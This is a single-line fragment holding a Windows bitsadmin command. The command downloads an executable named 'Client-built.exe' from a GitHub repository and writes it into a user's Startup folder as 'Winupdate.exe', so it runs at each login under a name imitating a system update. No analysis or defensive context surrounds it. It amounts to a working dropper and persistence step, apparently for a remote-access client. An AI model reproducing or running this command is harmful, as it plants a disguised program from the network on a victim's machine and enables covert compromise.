...
bitsadmin /transfer Packages /download /priority foreground https://github.com/qbsinthe/Lucille/raw/main/Client-built.exe "C:\Users\ezrag\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
